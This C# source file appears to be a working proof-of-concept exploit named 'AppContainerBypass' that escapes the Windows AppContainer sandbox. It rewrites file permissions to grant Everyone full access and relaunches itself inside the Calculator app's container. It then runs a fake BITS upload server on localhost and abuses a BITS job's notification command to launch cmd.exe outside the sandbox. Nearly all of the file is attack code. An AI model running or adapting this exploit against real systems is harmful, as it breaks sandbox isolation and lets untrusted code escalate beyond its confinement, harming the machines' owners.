using System;
using System.Collections.Generic;
using System.Diagnostics.CodeAnalysis;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using AppContainerBypass;
using NtApiDotNet;
using NtApiDotNet.Win32;

namespace AppContainerBypass
{

	class Program
	{
		static volatile ManualResetEvent me=new ManualResetEvent(false);
		static bool IsInAppContainer()
		{
			using (var token = NtToken.OpenProcessToken())
			{
				return token.AppContainer;
			}
		}

		static void UpdateSecurity(string path)
		{
			var sd = new NtApiDotNet.SecurityDescriptor("D:AI(A;;FA;;;WD)(A;;FA;;;AC)");
			using (var file = NtFile.Open(NtFileUtils.DosFileNameToNt(path), null, FileAccessRights.WriteDac))
			{
				file.SetSecurityDescriptor(sd, NtApiDotNet.SecurityInformation.Dacl);
			}
		}

		static void FixSecurity(string dir)
		{

			UpdateSecurity(dir);
			foreach (var file in Directory.GetFiles(dir))
			{
				UpdateSecurity(file);
			}
		}
		static string cmdExe = @"C:\Windows\System32\cmd.exe";
		static string mainExe = typeof(Program).Assembly.Location;

		static bool RestartInAppContainer(string[] args)
		{
			string FakeFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures), "1.txt");
			if (!File.Exists(FakeFile))
			{
				File.WriteAllText(FakeFile,"fake");

			}
			FixSecurity(Path.GetDirectoryName(typeof(Program).Assembly.Location));
			FixSecurity(Environment.GetFolderPath(Environment.SpecialFolder.MyPictures));


			List<Sid> caps = new List<Sid>
				{
					
					KnownSids.CapabilityInternetClient,
					KnownSids.CapabilityInternetClientServer,
					KnownSids.CapabilityPrivateNetworkClientServer,
					KnownSids.CapabilityPicturesLibrary

				};


			Win32ProcessConfig config = new Win32ProcessConfig
			{
				CreationFlags = CreateProcessFlags.NewConsole,
				CurrentDirectory = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
				ApplicationName = mainExe,
				CommandLine = mainExe + " " + FakeFile



			};
			config.SetAppContainerSidFromName("microsoft.windowscalculator_8wekyb3d8bbwe");

			config.Capabilities.AddRange(caps);

			using (var p = Win32Process.CreateProcess(config))
			{
				p.Process.Wait();
			}
			return true;

		}


		private static void Process_CANCEL_SESSION(HttpListenerContext context)
		{
			Guid SessionId = Guid.Parse(context.Request.Headers["BITS-Session-Id"].ToString());
			context.Response.Headers["BITS-Packet-Type"] = "Ack";
			context.Response.ContentLength64 = 0;
			context.Response.Headers["BITS-Session-Id"] = SessionId.ToString();
		}

		private static void Process_PING(HttpListenerContext context)
		{
			context.Response.Headers["BITS-Packet-Type"] = "Ack";
			context.Response.Headers["BITS-Error-Code"] = "1";
			context.Response.Headers["BITS-Error-Context"] = "";
			context.Response.ContentLength64 = 0;
		}

		private static void Process_CLOSE_SESSION(HttpListenerContext context)
		{
			Guid SessionId = Guid.Parse(context.Request.Headers["BITS-Session-Id"].ToString());
			context.Response.Headers["BITS-Packet-Type"] = "Ack";
			context.Response.ContentLength64 = 0;
			context.Response.Headers["BITS-Session-Id"] = SessionId.ToString();
		}
		private static void Process_FRAGMENT(HttpListenerContext context)
		{


			Guid SessionId = Guid.Parse(context.Request.Headers["BITS-Session-Id"].ToString());
			//string ContentName = context.Request.Headers["Content-Name"].ToString();
			string ContentRange = context.Request.Headers["Content-Range"].ToString();
			List<string> ContentRangeList = ContentRange.Split(new string[] { "/" }, StringSplitOptions.RemoveEmptyEntries).ToList();
			List<string> crange = ContentRangeList[0].Split(new string[] { "-" }, StringSplitOptions.RemoveEmptyEntries).ToList();
			string total_length = ContentRangeList[1];
			string range_start = crange[0];
			string range_end = crange[1];
			Console.Write("Process Process_FRAGMENT:range_start:" + range_start + ",range_end:" + range_end + ",total_length:" + total_length + Environment.NewLine);
			context.Response.Headers["BITS-Packet-Type"] = "Ack";
			context.Response.ContentLength64 = 0;
			context.Response.Headers["BITS-Session-Id"] = SessionId.ToString();
			context.Response.Headers["BITS-Received-Content-Range"] = (int.Parse(range_end) + 1).ToString();
		}
		private static void Process_CREATE_SESSION(HttpListenerContext context)
		{
			string supported_protocols = "{7df0354d-249b-430f-820d-3d2a9bef4931}";
			List<string> BITSSupportedProtocolsList = context.Request.Headers["BITS-Supported-Protocols"].Split(new string[] { " " }, StringSplitOptions.RemoveEmptyEntries).ToList();
			if (BITSSupportedProtocolsList.Contains(supported_protocols))
			{
				Guid SessionId = Guid.NewGuid();
				context.Response.ContentLength64 = 0;
				context.Response.Headers["BITS-Protocol"] = supported_protocols;
				context.Response.Headers["BITS-Packet-Type"] = "Ack";
				context.Response.Headers["BITS-Session-Id"] = SessionId.ToString();
			}
		}

		private static void Process_BITS_POST(HttpListenerContext context)
		{
			try
			{


				if (context.Request.Headers["BITS-Packet-Type"] != null)
				{
					string BITSPacketType = context.Request.Headers["BITS-Packet-Type"].ToString().ToUpper();
					Console.Write("Process BITSPacketType:" + BITSPacketType + Environment.NewLine);
					switch (BITSPacketType)
					{
						case "CREATE-SESSION":
							{

								Process_CREATE_SESSION(context);

								break;
							}
						case "FRAGMENT":
							{
								Process_FRAGMENT(context);
								break;
							}
						case "CLOSE-SESSION":
							{
								Process_CLOSE_SESSION(context);
								break;
							}
						case "CANCEL-SESSION":
							{
								Process_CANCEL_SESSION(context);

								break;
							}
						case "PING":
							{
								Process_PING(context);
								break;
							}
						default:
							{

								break;
							}
					}

					context.Response.StatusCode = 200;
					context.Response.Close();

				}
			}
			catch (Exception e)
			{
				context.Response.StatusCode = 500;
				context.Response.Headers["BITS-Error-Code"] = "1";
				context.Response.Close();
				Console.WriteLine(e);

			}
			
		}


		private static void StartBitsServer()
		{
			try
			{

			
			using (HttpListener listener = new HttpListener())
			{
				listener.Prefixes.Add("http://localhost:5686/");
				listener.Start();
				Console.Write("StartBitsServer"+Environment.NewLine);
				me.Set();

				while (true)
				{
					HttpListenerContext context = listener.GetContext();

					Console.Write("Process Method:" + context.Request.HttpMethod.ToUpper() + Environment.NewLine);
					switch (context.Request.HttpMethod.ToUpper())
					{
						case "BITS_POST":
							{
								Process_BITS_POST(context);
								break;
							}
						default:
							{
								break;
							}
					}
				}
				}
			}
			catch (Exception e)
			{
				Console.WriteLine(e);
				throw;
			}
		}

		static void Main(string[] args)
		{
			try
			{


				
				if (IsInAppContainer())
				{
					RunBtsJob(args[0]);
				}
				else
				{
					Task.Factory.StartNew(() =>
					{
						StartBitsServer();
					});
					me.WaitOne();
					RestartInAppContainer(args.ToArray());

				}
			}
			catch (Exception e)
			{
				Console.WriteLine(e);
				throw;
			}
		}

		private static void RunBtsJob(string file)
		{
			IBackgroundCopyManager mgr = new BackgroundCopyManager() as IBackgroundCopyManager;
			Guid jobGuid;
			IBackgroundCopyJob job1;
			mgr.CreateJob("fake", BG_JOB_TYPE.BG_JOB_TYPE_UPLOAD, out jobGuid, out job1);
			IBackgroundCopyJob2 job = job1 as IBackgroundCopyJob2;
			job.SetNotifyCmdLine(cmdExe, cmdExe);
			job.SetNotifyFlags(BG_JOB_NOTIFICATION_TYPE.BG_NOTIFY_JOB_TRANSFERRED);
			job.AddFile("http://localhost:5686/fake.png", file);
			job.Resume();
			BG_JOB_STATE stat = BG_JOB_STATE.BG_JOB_STATE_QUEUED;
			while (stat != BG_JOB_STATE.BG_JOB_STATE_TRANSFERRED)
			{
				Thread.Sleep(1000);
				job.GetState(out stat);
			}
			job.Complete();
			Console.Write("Success");
		}
	}
}
